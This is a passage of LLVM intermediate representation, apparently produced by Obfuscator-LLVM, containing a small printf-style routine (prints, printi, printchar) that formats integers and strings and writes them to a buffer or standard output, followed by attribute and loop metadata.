.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #1 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #1 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #6
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

attributes #0 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { argmemonly nounwind }
attributes #8 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind readnone }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = !{!5}
!5 = distinct !{!5, !6}
!6 = distinct !{!6, !"LVerDomain"}
!7 = !{!8}
!8 = distinct !{!8, !6}
!9 = distinct !{!9, !10}
!10 = !{!"llvm.loop.unroll.disable"}
!11 = distinct !{!11, !2, !3}
!12 = distinct !{!12, !10}
!13 = distinct !{!13, !2, !3}
!14 = !{!15}
!15 = distinct !{!15, !16}
!16 = distinct !{!16, !"LVerDomain"}
!17 = !{!18}
!18 = distinct !{!18, !16}
!19 = distinct !{!19, !10}
!20 = distinct !{!20, !2, !3}
!21 = distinct !{!21, !2, !3}
!22 = !{i32 -2146540370}
!23 = !{i32 -2146538930}
!24 = !{i32 -2146538220}
!25 = !{i32 -2146537402}
!26 = !{i32 -2146536511}
!27 = distinct !{!27, !2, !3}
!28 = distinct !{!28, !29, !2, !3}
!29 = !{!"llvm.loop.unroll.runtime.disable"}
